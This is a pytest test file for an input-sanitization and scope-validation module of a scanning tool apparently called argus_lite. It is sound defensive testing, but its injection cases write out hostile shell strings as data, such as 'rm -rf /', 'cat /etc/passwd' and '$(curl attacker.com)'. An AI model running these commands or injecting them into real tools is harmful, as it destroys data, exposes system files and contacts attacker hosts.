"""TDD: Tests for input sanitization — written BEFORE implementation."""

import pytest


class TestSanitizeTarget:
    """Test sanitize_target() function."""

    def test_valid_domain(self):
        from argus_lite.core.validator import sanitize_target

        assert sanitize_target("example.com") == "example.com"

    def test_valid_subdomain(self):
        from argus_lite.core.validator import sanitize_target

        assert sanitize_target("sub.example.com") == "sub.example.com"

    def test_valid_ip(self):
        from argus_lite.core.validator import sanitize_target

        assert sanitize_target("192.168.1.1") == "192.168.1.1"

    def test_strips_whitespace(self):
        from argus_lite.core.validator import sanitize_target

        assert sanitize_target("  example.com  ") == "example.com"

    def test_lowercases(self):
        from argus_lite.core.validator import sanitize_target

        assert sanitize_target("Example.COM") == "example.com"

    def test_rejects_semicolon_injection(self):
        from argus_lite.core.validator import InputSanitizationError, sanitize_target

        with pytest.raises(InputSanitizationError):
            sanitize_target("example.com; rm -rf /")

    def test_rejects_pipe_injection(self):
        from argus_lite.core.validator import InputSanitizationError, sanitize_target

        with pytest.raises(InputSanitizationError):
            sanitize_target("example.com | cat /etc/passwd")

    def test_rejects_dollar_injection(self):
        from argus_lite.core.validator import InputSanitizationError, sanitize_target

        with pytest.raises(InputSanitizationError):
            sanitize_target("$(curl attacker.com)")

    def test_rejects_backtick_injection(self):
        from argus_lite.core.validator import InputSanitizationError, sanitize_target

        with pytest.raises(InputSanitizationError):
            sanitize_target("`whoami`")

    def test_rejects_ampersand_injection(self):
        from argus_lite.core.validator import InputSanitizationError, sanitize_target

        with pytest.raises(InputSanitizationError):
            sanitize_target("example.com & echo pwned")

    def test_rejects_redirect_injection(self):
        from argus_lite.core.validator import InputSanitizationError, sanitize_target

        with pytest.raises(InputSanitizationError):
            sanitize_target("example.com > /tmp/out")

    def test_rejects_empty_string(self):
        from argus_lite.core.validator import InputSanitizationError, sanitize_target

        with pytest.raises(InputSanitizationError):
            sanitize_target("")

    def test_rejects_only_whitespace(self):
        from argus_lite.core.validator import InputSanitizationError, sanitize_target

        with pytest.raises(InputSanitizationError):
            sanitize_target("   ")

    def test_rejects_invalid_ip_octets(self):
        from argus_lite.core.validator import InputSanitizationError, sanitize_target

        with pytest.raises(InputSanitizationError):
            sanitize_target("999.999.999.999")

    def test_rejects_single_char_domain(self):
        from argus_lite.core.validator import InputSanitizationError, sanitize_target

        with pytest.raises(InputSanitizationError):
            sanitize_target("a")

    def test_valid_localhost(self):
        from argus_lite.core.validator import sanitize_target

        assert sanitize_target("localhost") == "localhost"

    def test_valid_hyphenated_domain(self):
        from argus_lite.core.validator import sanitize_target

        assert sanitize_target("my-site.example.com") == "my-site.example.com"

    def test_strips_url_scheme(self):
        from argus_lite.core.validator import sanitize_target

        assert sanitize_target("https://example.com") == "example.com"

    def test_strips_trailing_slash(self):
        from argus_lite.core.validator import sanitize_target

        assert sanitize_target("example.com/") == "example.com"

    def test_strips_path(self):
        from argus_lite.core.validator import sanitize_target

        assert sanitize_target("example.com/path/to/page") == "example.com"


class TestScopeValidation:
    """Test scope validation with allowlist/denylist."""

    def test_target_in_allowlist_passes(self, sample_allowlist):
        from argus_lite.core.validator import validate_scope

        result = validate_scope("example.com", allowlist_path=sample_allowlist)
        assert result.allowed is True

    def test_target_not_in_allowlist_when_strict(self, sample_allowlist):
        from argus_lite.core.validator import validate_scope

        result = validate_scope(
            "unknown.com",
            allowlist_path=sample_allowlist,
            allowlist_only=True,
        )
        assert result.allowed is False
        assert "allowlist" in result.reason.lower()

    def test_target_in_denylist_blocked(self, sample_denylist):
        from argus_lite.core.validator import validate_scope

        result = validate_scope("google.com", denylist_path=sample_denylist)
        assert result.allowed is False
        assert "denylist" in result.reason.lower()

    def test_target_not_in_denylist_passes(self, sample_denylist):
        from argus_lite.core.validator import validate_scope

        result = validate_scope("example.com", denylist_path=sample_denylist)
        assert result.allowed is True

    def test_local_network_warning(self):
        from argus_lite.core.validator import validate_scope

        result = validate_scope("192.168.1.1")
        assert result.is_local_network is True

    def test_reserved_range_10(self):
        from argus_lite.core.validator import validate_scope

        result = validate_scope("10.0.0.1")
        assert result.is_local_network is True

    def test_public_ip_not_local(self):
        from argus_lite.core.validator import validate_scope

        result = validate_scope("8.8.8.8")
        assert result.is_local_network is False

    def test_no_lists_allows_all(self):
        from argus_lite.core.validator import validate_scope

        result = validate_scope("anything.com")
        assert result.allowed is True
